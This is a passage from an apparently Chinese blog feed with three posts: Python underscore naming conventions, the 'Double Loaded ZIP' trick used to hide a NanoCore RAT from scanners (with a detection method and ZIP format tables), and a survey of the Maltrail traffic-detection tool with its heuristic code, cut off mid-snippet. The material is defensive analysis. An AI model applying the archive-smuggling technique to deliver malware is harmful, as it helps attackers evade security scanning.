    <content type="html"><![CDATA[<p>本文介绍了 Python 中单下划线和双下划线的各种含义及命名约定。</p><h2 id="单前导下划线"><a href="#单前导下划线" class="headerlink" title="单前导下划线"></a>单前导下划线</h2><p>示例：<code>_var</code></p><p>单下划线开头的命名方式被常用于模块中，有一个约定俗成的含义，表示希望这个变量或方法仅供 <strong>内部使用</strong>，是对程序员的一种提示。</p><p>在实际使用中与常规 var 变量存在的一点区别是，当使用 <code>from my_module import *</code> 导入时，单下划线开头的_var 变量和方法是不会被导入的。但使用 <code>import my_module</code> 导入的话，仍然可以用 <code>my_module._var</code> 这样的形式访问属性或方法。</p><h2 id="单末尾下划线"><a href="#单末尾下划线" class="headerlink" title="单末尾下划线"></a>单末尾下划线</h2><p>示例：<code>var_</code></p><p>单下划线结尾的命名方式也存在，但是不常用，其实也不推荐用。这种命名方式的作用就是为了和 Python 的一些内置关键词区分开来，假设我们想给一个变量命名为 class，但是这会跟 Python 的关键词 class 冲突，所以我们只好退一步使用单下划线结尾命名，也就是 class_。</p><h2 id="双前导下划线"><a href="#双前导下划线" class="headerlink" title="双前导下划线"></a>双前导下划线</h2><p>示例：<code>__var</code></p><p>双下划线开头的命名方式有更为实际的作用，采用这种命名的变量或方法无法直接通过 <code>对象名.变量名/方法名</code> 这样的方式访问，类似于 Python 的 “私有变量”。双下划线前缀会导致 Python 解释器重写属性名称，以避免子类中的命名冲突，这种行为也叫做 <strong>名称修饰（name mangling）</strong>。</p><h2 id="双前导双末尾下划线"><a href="#双前导双末尾下划线" class="headerlink" title="双前导双末尾下划线"></a>双前导双末尾下划线</h2><p>示例：<code>__var__</code></p><p>以双下划线开头和结尾的是一些 Python 的 “魔术” 对象，如类成员的 __init__、__del__、__add__、__getitem__ 等，以及全局的 __file__、__name__ 等。需要注意的是，如果一个名字同时以双下划线开头和结尾，则不会应用名称修饰，即被双下划线前缀和后缀包围的变量不会被 Python 解释器修改。</p><p>Python 官方推荐 <strong>永远不要</strong> 将这样的命名方式应用于自己的变量或函数，而是按照文档说明来使用，以避免与将来 的 Python 语言产生冲突。</p><h2 id="单下划线"><a href="#单下划线" class="headerlink" title="单下划线 _"></a>单下划线 _</h2><p>示例：<code>_</code></p><p>按照习惯，有时候单个的独立下划线可以用作一个名字，来表示某个变量是 <strong>临时的</strong> 或 <strong>无关紧要的</strong>。例如，在下面的循环中，我们不需要访问正在运行的索引，那么可以使用 ‘_’ 来表示它只是一个临时值：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br><span class="hljs-meta">... </span>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, World.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>除了用作临时变量之外，<code>_</code> 是大多数 Python REPL（交互窗口）中的一个特殊变量，表示由解释器评估的最近一个表达式的结果，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">2</span> + <span class="hljs-number">3</span><br><span class="hljs-number">5</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>_<br><span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><table><thead><tr><th>模式</th><th>举例</th><th>含义</th></tr></thead><tbody><tr><td>单前导下划线</td><td>_var</td><td>命名约定，表示希望变量或方法仅供内部使用。</td></tr><tr><td>单末尾下划线</td><td>var_</td><td>命名约定，用于避免和 Python 的一些内置关键词冲突。</td></tr><tr><td>双前导下划线</td><td>__var</td><td>在类中使用时会触发名称修饰，类似于 Python 的“私有变量”。</td></tr><tr><td>双前导双末尾下划线</td><td>__var__</td><td>Python 语言定义的“魔术”对象，应该避免使用这种命名方式。</td></tr><tr><td>单下划线</td><td>_</td><td>有时作为临时的或无关紧要的变量的名称。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>命名规范</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Double Loaded ZIP File 绕过手法</title>
    <link href="/post/Double%20Loaded%20ZIP%20File%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/"/>
    <url>/post/Double%20Loaded%20ZIP%20File%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>大多数通过邮件传播的恶意软件都是打包为 ZIP、RAR、7z 等方式进行传播的。近日，研究人员发现了一个新型的恶意文件压缩方式，即 Double Loaded Zip File 双加载 ZIP 文件。</p><p>就本例而言，他包含有两个 ZIP 文件结构（2 个 EOCD）。第一个 ZIP 结构中包含有一个无恶意的 PNG 格式的图像文件 order.jpg（不是扩展名显示的 jpeg 格式），order.jpg 实际上一个诱饵文件，用来隐藏另一个 ZIP 结构的内容。第二个 ZIP 结构中包含 SHIPPING_MX00034900_PL_INV_pdf.exe，其实是一个远程木马 NanoCore RAT。</p><p>很明显，攻击者想尝试使用这种 dual archive 的方式来绕过安全扫描。</p><h2 id="0x01-文件特征"><a href="#0x01-文件特征" class="headerlink" title="0x01 文件特征"></a>0x01 文件特征</h2><ol><li>ZIP 文件的文件大小明显大于其压缩前的内容；</li><li>ZIP 文件的压缩方式都为 0008（deflate）；</li><li>ZIP 文件中有两个 End of Central Directory (EOCD) 标志，这表明存在两个独立的 ZIP 结构；</li><li>ZIP 文件 EOCD 标志后的 “核心目录结构总数” 都为 0001。</li></ol><p><img src="/img/DoubleLoadedZIPFile%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/6a0133f264aa62970b0240a4983f91200c-800wi.jpg" alt="ZIP_attachment"></p><h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h2><p>只有在用户使用某些特定的压缩工具时才会成功，比如 PowerArchiver、WinRAR 和 7-Zip 的某些版本。</p><p>![The ZIP content as per the archiving tools](/img/Double Loaded ZIP File绕过手法/6a0133f264aa62970b0240a4e62353200b-700wi.jpg)</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>正常情况下 ZIP 压缩文件<strong>有且只有</strong>一个 EOCD 标志，存在于整个压缩包的结尾。因此，可以根据 ZIP 文件中<strong>是否存在两个及两个以上的目录结束标志（EOCD，End of Central Directory）</strong>，来检测是否存在 Double Loaded Zip File。</p><blockquote><p>EOCD：504B0506</p></blockquote><h2 id="附录：ZIP-文件格式分析"><a href="#附录：ZIP-文件格式分析" class="headerlink" title="附录：ZIP 文件格式分析"></a>附录：ZIP 文件格式分析</h2><p>通常情况下，我们所用 ZIP 文件格式包含有三个部分：<strong>压缩源文件数据区、压缩源文件目录区、压缩源文件目录结束标志</strong>。当 ZIP 压缩的文件不止一个时，压缩源文件数据区将会有多组 **[文件头+文件数据+数据描述符]**，ZIP 对每个文件都进行了独立压缩，故每个压缩的文件都将对应一条记录。</p><p><img src="/img/DoubleLoadedZIPFile%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95/8754535-34c5342c1f4951b2.png"></p><h3 id="Local-file-header-文件头"><a href="#Local-file-header-文件头" class="headerlink" title="Local file header 文件头"></a>Local file header 文件头</h3><p>文件头主要用于表示此文件的开始，记录了此文件压缩的信息，具体字段的含义如下表。（注：偏移量为十进制）</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">文件头标识，固定值为0x04034b50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">解压文件所需的pkware最低版本</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center"><strong>Genera purpose bit flag 通用比特标志位</strong></td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center"><strong>Compression method 压缩方式</strong></td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">12</td><td align="center">2</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">14</td><td align="center">4</td><td align="center"><strong>crc32校验码</strong></td></tr><tr><td align="center">18</td><td align="center">4</td><td align="center">压缩后的大小</td></tr><tr><td align="center">22</td><td align="center">4</td><td align="center">未压缩的大小</td></tr><tr><td align="center">26</td><td align="center">4</td><td align="center">文件名长度</td></tr><tr><td align="center">28</td><td align="center">2</td><td align="center">扩展区长度</td></tr><tr><td align="center">30</td><td align="center">n</td><td align="center">文件名</td></tr><tr><td align="center">30+n</td><td align="center">m</td><td align="center">扩展区</td></tr></tbody></table><h3 id="Centra-directory-压缩源文件目录区"><a href="#Centra-directory-压缩源文件目录区" class="headerlink" title="Centra directory 压缩源文件目录区"></a>Centra directory 压缩源文件目录区</h3><p>核心目录主要是记录压缩文件的目录信息，每个压缩源文件数据区的记录对应此压缩源文件目录去的一条记录。</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">字段说明</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">核心目录文件头标志，固定值为0x02014B50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">压缩所用的PKWare版本</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center">解压所需的PKWare最低版本</td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center">Genera purpose bit flag 通用比特标志位</td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">Compression method 压缩方式</td></tr><tr><td align="center">12</td><td align="center">2</td><td align="center">文件最后修改时间</td></tr><tr><td align="center">14</td><td align="center">2</td><td align="center">文件最后修改日期</td></tr><tr><td align="center">16</td><td align="center">4</td><td align="center">CRC32校验码</td></tr><tr><td align="center">20</td><td align="center">4</td><td align="center">压缩后的大小</td></tr><tr><td align="center">24</td><td align="center">4</td><td align="center">未压缩的大小</td></tr><tr><td align="center">28</td><td align="center">2</td><td align="center">文件名长度</td></tr><tr><td align="center">30</td><td align="center">2</td><td align="center">扩展域长度</td></tr><tr><td align="center">32</td><td align="center">2</td><td align="center">文件注释长度</td></tr><tr><td align="center">34</td><td align="center">2</td><td align="center">文件开始位置的磁盘编号</td></tr><tr><td align="center">36</td><td align="center">2</td><td align="center">内部文件属性</td></tr><tr><td align="center">38</td><td align="center">4</td><td align="center">外部文件属性</td></tr><tr><td align="center">42</td><td align="center">4</td><td align="center">本地文件头的相对偏移</td></tr><tr><td align="center">46</td><td align="center">n</td><td align="center">目录文件名</td></tr><tr><td align="center">46+n</td><td align="center">m</td><td align="center">扩展域</td></tr><tr><td align="center">46+n+m</td><td align="center">k</td><td align="center">文件注释内容</td></tr></tbody></table><h3 id="End-of-Central-directory-recored-压缩源文件目录结束标志"><a href="#End-of-Central-directory-recored-压缩源文件目录结束标志" class="headerlink" title="End of Central directory recored 压缩源文件目录结束标志"></a>End of Central directory recored 压缩源文件目录结束标志</h3><p>目录结束标志用于标记压缩的目录数据的结束，每个压缩文件对应在此数据区有一记录。</p><table><thead><tr><th align="center">偏移量</th><th align="center">占用字节数</th><th align="center">字段说明</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">4</td><td align="center">核心目录结束标记，固定值0x06054B50</td></tr><tr><td align="center">4</td><td align="center">2</td><td align="center">当前目录结束标记</td></tr><tr><td align="center">6</td><td align="center">2</td><td align="center">核心目录开始位置的磁盘编号</td></tr><tr><td align="center">8</td><td align="center">2</td><td align="center">磁盘上所记录的核心目录数量</td></tr><tr><td align="center">10</td><td align="center">2</td><td align="center">核心目录结构总数</td></tr><tr><td align="center">12</td><td align="center">4</td><td align="center">核心目录的大小</td></tr><tr><td align="center">16</td><td align="center">4</td><td align="center">核心目录开始位置相对于archive开始位置的位移</td></tr><tr><td align="center">20</td><td align="center">2</td><td align="center">注释长度</td></tr><tr><td align="center">22</td><td align="center">n</td><td align="center">注释内容</td></tr></tbody></table><p><strong>参考文章：</strong><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/double-loaded-zip-file-delivers-nanocore/">Double Loaded Zip File Delivers Nanocore</a><br><a href="https://www.jianshu.com/p/2f9431b21003?tdsourcetag=s_pctim_aiomsg">有关 ZIP 压缩包的破解</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maltrail 恶意流量检测工具调研</title>
    <link href="/post/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/"/>
    <url>/post/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p><a href="https://github.com/stamparm/maltrail">Maltrail</a> - Malicious traffic detection system，一款轻量级的恶意流量检测系统。</p><h2 id="0x01-特性"><a href="#0x01-特性" class="headerlink" title="0x01 特性"></a>0x01 特性</h2><ul><li>使用多个开源黑名单 (alientvault, autoshun, badips, sblam etc.)</li><li>有大量静态特征可供识别 (domain names, URLs, IP addresses or User-Agent values)</li><li>可检测未知威胁的启发式机制</li><li>系统采用 <code>流量</code> –&gt; <code>传感器</code> &lt;–&gt; <code>服务器</code> &lt;–&gt; <code>客户端</code> 的架构方式：<ul><li>传感器（Sensor）：负责采集网络流量，更新恶意样本，并进行特征匹配。</li><li>服务端（Server）：提供 Web 界面以及收集网络中的恶意样本流量。</li><li>客户端（Client）：访问和检索恶意流量信息。</li></ul></li><li>Web 报告页面</li></ul><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><p>OS：Kali Linux；</p><p>使用最小化安装，即 Sensor 和 Server 在同一台机器上；</p><p>1.安装依赖库，下载源码包</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git python-pcapy<br>git clone https://github.com/stamparm/maltrail.git<br></code></pre></td></tr></table></figure><p>2.启动 Sensor</p><p>第一次启动 Sensor 会自动下载各个 IOC 库；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd maltrail<br>sudo python sensor.py<br></code></pre></td></tr></table></figure><p>3.启动 Server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python server.py<br></code></pre></td></tr></table></figure><p>4.测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ping -c 1 136.161.101.53<br>cat /var/log/maltrail/$(date +&quot;%Y-%m-%d&quot;).log<br></code></pre></td></tr></table></figure><p>5.网页打开 <a href="http://127.0.0.1:8338/">http://127.0.0.1:8338</a> ，用户名：admin，密码：changeme!</p><h2 id="0x03-检测方式"><a href="#0x03-检测方式" class="headerlink" title="0x03 检测方式"></a>0x03 检测方式</h2><ol><li>网络流量实时嗅探分析（默认行为，指定网卡进行数据包捕获）</li><li>离线 pcap 文件分析（指定 “-i” 参数，调用 pcapy 解析 pcap 文件）</li></ol><h2 id="0x04-特征源"><a href="#0x04-特征源" class="headerlink" title="0x04 特征源"></a>0x04 特征源</h2><ul><li>IOC 列表（恶意/可疑）<ul><li>静态列表：从各种恶意软件报告、论文以及个人研究文档中获取的恶意样本（maltrail/trails/static/malware、maltrail/trails/static/suspicious）</li><li>实时订阅源：从各种开源黑样本网站上下载的恶意样本，定期更新（update.py、maltrail/trails/feeds）</li><li>用户自定义列表：可以按照指定格式扩展订阅源（maltrail/trails/custom）</li></ul></li><li>高级启发式机制，可以帮助发现未知的威胁。</li></ul><h2 id="0x05-核心模块"><a href="#0x05-核心模块" class="headerlink" title="0x05 核心模块"></a>0x05 核心模块</h2><ul><li>update.py：更新 trails 中的所有订阅源，并将结果保存到 /root/.maltrail/trails.csv，主要使用 <code>update_trails</code> 方法</li><li>httpd.py：HTTP 入侵检测模块</li><li>settings.py：控制 Sensor 的嗅探及检测行为</li><li>sensor.py：传感器主程序</li><li>server.py：服务端主程序</li><li>log.py：日志记录模块</li><li>trails 目录：存放所有与 IOC 有关的信息</li><li>html 目录：生成 Client Web 页面</li></ul><h2 id="0x06-实际应用"><a href="#0x06-实际应用" class="headerlink" title="0x06 实际应用"></a>0x06 实际应用</h2><h3 id="1-大规模扫描（Mass-Scan）"><a href="#1-大规模扫描（Mass-Scan）" class="headerlink" title="1.大规模扫描（Mass Scan）"></a>1.大规模扫描（Mass Scan）</h3><p>类似 Shodan 和 ZoomEye 这样的组织会扫描整个网络，并通过他们的搜索引擎（给其他潜在的攻击者）免费提供所有结果（Maltrail 也可以利用这些信息，去溯源攻击者）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4c5136567530302e706e67.png" alt="Shodan"></p><h3 id="2-匿名-Tor-攻击（Anonymous-attackers）"><a href="#2-匿名-Tor-攻击（Anonymous-attackers）" class="headerlink" title="2.匿名 Tor 攻击（Anonymous attackers）"></a>2.匿名 Tor 攻击（Anonymous attackers）</h3><p>Maltrail 利用 Tor 出口节点的公共列表来发现隐藏在 Tor 匿名网络背后的潜在攻击者。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f6458463872324b2e706e67.png" alt="Tor attacker"></p><h3 id="3-服务攻击（Service-attackers）"><a href="#3-服务攻击（Service-attackers）" class="headerlink" title="3.服务攻击（Service attackers）"></a>3.服务攻击（Service attackers）</h3><p>检测黑域名、黑 IP对组织范围内特定服务的访问情况。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4f6f32616443662e706e67.png" alt="RDP brute force"></p><h3 id="4-恶意软件（Malware）"><a href="#4-恶意软件（Malware）" class="headerlink" title="4.恶意软件（Malware）"></a>4.恶意软件（Malware）</h3><p>如果组织内部受感染的计算机试图连接已知的 C&amp;C 服务器，可以检出威胁并对识别出恶意软件家族（威胁信息）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f47424c5749536f2e706e67.png" alt="beebone malware"></p><h3 id="5-可疑域名（Suspicious-domain-lookups）"><a href="#5-可疑域名（Suspicious-domain-lookups）" class="headerlink" title="5.可疑域名（Suspicious domain lookups）"></a>5.可疑域名（Suspicious domain lookups）</h3><p>Maltrail 包含有已知经常参与可疑活动的 TLD 域的静态列表（特征匹配），和由恶意软件生成的 DGA 域名、Tor 域名（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f4a544764744a302e706e67.png" alt="DGA"></p><h3 id="6-可疑-IPinfo（Suspicious-ipinfo-requests）"><a href="#6-可疑-IPinfo（Suspicious-ipinfo-requests）" class="headerlink" title="6.可疑 IPinfo（Suspicious ipinfo requests）"></a>6.可疑 IPinfo（Suspicious ipinfo requests）</h3><p>由于许多恶意软件使用某种 ipinfo 服务（例如 <a href="http://ipinfo.io/">ipinfo.io</a>）来查找受害者的互联网 IP 地址，因此，应该对这类请求进行密切监视。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f36534d4e3061742e706e67.png" alt="ipinfo filter"></p><h3 id="7-可疑文件下载（Suspicious-direct-file-downloads）"><a href="#7-可疑文件下载（Suspicious-direct-file-downloads）" class="headerlink" title="7.可疑文件下载（Suspicious direct file downloads）"></a>7.可疑文件下载（Suspicious direct file downloads）</h3><p>跟踪所有可疑的文件下载（例如<code>.apk</code>, <code>.chm</code>, <code>.egg</code>, <code>.exe</code>, <code>.hta</code>, <code>.hwp</code>, <code>.ps1</code>, <code>.scr</code>, <code>.sct</code> 文件扩展名），这可能会引发大量误报，但最终可能有助于重建感染链（由于合法的服务提供商，通常使用加密的HTTPS执行此类下载）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f6a7235425331682e706e67.png" alt="Direct.exe download"></p><h3 id="8-可疑-HTTP-请求（Suspicious-HTTP-requests）"><a href="#8-可疑-HTTP-请求（Suspicious-HTTP-requests）" class="headerlink" title="8.可疑 HTTP 请求（Suspicious HTTP requests）"></a>8.可疑 HTTP 请求（Suspicious HTTP requests）</h3><p>可以检出来自外部 Web 应用程序安全扫描程序的可疑请求（如 SQL、XSS、LFI 等）和内部用户对未知 Web 站点的恶意请求（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f517a63614573472e706e67.png" alt="Vulnerability scan"></p><h3 id="9-端口扫描（Port-scanning）"><a href="#9-端口扫描（Port-scanning）" class="headerlink" title="9.端口扫描（Port scanning）"></a>9.端口扫描（Port scanning）</h3><p>如果多次的尝试连接大量的不同的 TCP 端口，Maltrail 将警告存在潜在的端口扫描行为（启发式检测机制），能够识别 nmap 等流行的扫描工具。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f5653374c3241332e706e67.png" alt="nmap scan"></p><h3 id="10-DNS-耗竭攻击（DNS-resource-exhaustion）"><a href="#10-DNS-耗竭攻击（DNS-resource-exhaustion）" class="headerlink" title="10.DNS 耗竭攻击（DNS resource exhaustion）"></a>10.DNS 耗竭攻击（DNS resource exhaustion）</h3><p>如果有大量的 DNS 递归查询（随机子域名），Maltrail 将警告存在潜在的DDoS攻击行为（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f52756a686e4b572e706e67.png" alt="DNS resource exhaustion"></p><h3 id="11-敏感信息泄露（Data-leakage）"><a href="#11-敏感信息泄露（Data-leakage）" class="headerlink" title="11.敏感信息泄露（Data leakage）"></a>11.敏感信息泄露（Data leakage）</h3><p>有些程序会表现出类似于恶意软件的行为，它们会将潜在的敏感数据发送到远程机器（尤其是基于移动设备的），Maltrail 会试图捕获这样的行为（启发式检测机制）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f367a74326758672e706e67.png" alt="Data leakage"></p><h3 id="12-误报处理（False-positives）"><a href="#12-误报处理（False-positives）" class="headerlink" title="12.误报处理（False positives）"></a>12.误报处理（False positives）</h3><p>与所有其他安全解决方案一样，Maltrail 容易出现”误报“，这时需要管理员投入一些额外的时间，并（以其他方式）检查“可疑 trail”是否确实存在恶意（通过实时关联其他开源情报）。</p><p><img src="/img/Maltrail%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/68747470733a2f2f692e696d6775722e636f6d2f346353394e4a422e706e67.png" alt="Google false positive"></p><h2 id="0x07-关注点"><a href="#0x07-关注点" class="headerlink" title="0x07 关注点"></a>0x07 关注点</h2><ul><li><p>IOC 数据采集模块的提取和利用</p><ul><li>重点是对 IOC 的收集利用，要建立一套成熟的 OpenIOC 机制；</li><li>对搜集到的 IOC 要同时记录其关联的攻击类型、组织信息（而不是仅仅像 <a href="https://github.com/stamparm/ipsum">IPsum</a> 那样）。</li></ul></li><li><p>在 Web 平台显示恶意 IP 相关的 whois 信息及威胁信息</p><ul><li>可以手动添加/修改 whois 信息及威胁信息；</li><li>使用 <a href="https://www.shodan.io/">Shodan</a>、<a href="http://www.zoomeye.org/">ZoomEye</a>、<a href="https://duckduckgo.com/">DuckDuckGo</a>、<a href="http://www.ripe.net/">RIPE</a> 等网站提供的信息。</li></ul></li></ul><h2 id="附：Maltrail-heuristic-判定"><a href="#附：Maltrail-heuristic-判定" class="headerlink" title="附：Maltrail heuristic 判定"></a>附：Maltrail heuristic 判定</h2><p>1.域名有效长度超长（24个字符）- long domain (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts[<span class="hljs-number">0</span>]) &gt; SUSPICIOUS_DOMAIN_LENGTH_THRESHOLD <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> parts[<span class="hljs-number">0</span>]:<br></code></pre></td></tr></table></figure><p>2.SIP 每秒连接 DIP 次数过多（10次） - potential port scanning</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> sec &gt; connect_sec:<br>  <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> _connect_src_dst:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(_connect_src_dst[key]) &gt; PORT_SCANNING_THRESHOLD:<br>      _src_ip, _dst_ip = key.split(<span class="hljs-string">&#x27;~&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_whitelisted(_src_ip):<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> _connect_src_details[key]:<br>          log_event((sec, usec, _src_ip, _[<span class="hljs-number">2</span>], _dst_ip, _[<span class="hljs-number">3</span>], PROTO.TCP, TRAIL.IP, _src_ip, <span class="hljs-string">&quot;potential port scanning&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)<br></code></pre></td></tr></table></figure><p>3.TCP 流量命中以下规则 - sinkhole response (malware)、seized domain (suspicious)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> tcp_data.startswith(<span class="hljs-string">&quot;HTTP/&quot;</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> tcp_data[:tcp_data.find(<span class="hljs-string">&quot;\r\n\r\n&quot;</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;X-Sinkhole:&quot;</span>, <span class="hljs-string">&quot;X-Malware-Sinkhole:&quot;</span>, <span class="hljs-string">&quot;Server: You got served&quot;</span>, <span class="hljs-string">&quot;Server: Apache 1.0/SinkSoft&quot;</span>, <span class="hljs-string">&quot;sinkdns.org&quot;</span>)) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;\r\n\r\nsinkhole&quot;</span> <span class="hljs-keyword">in</span> tcp_data:<br>    log_event((sec, usec, src_ip, src_port, dst_ip, dst_port, PROTO.TCP, TRAIL.IP, src_ip, <span class="hljs-string">&quot;sinkhole response (malware)&quot;</span>, <span class="hljs-string">&quot;(heuristic)&quot;</span>), packet)<br>    <span class="hljs-keyword">else</span>:<br>      index = tcp_data.find(<span class="hljs-string">&quot;&lt;title&gt;&quot;</span>)<br>      <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-number">0</span>:<br>        title = tcp_data[index + <span class="hljs-built_in">len</span>(<span 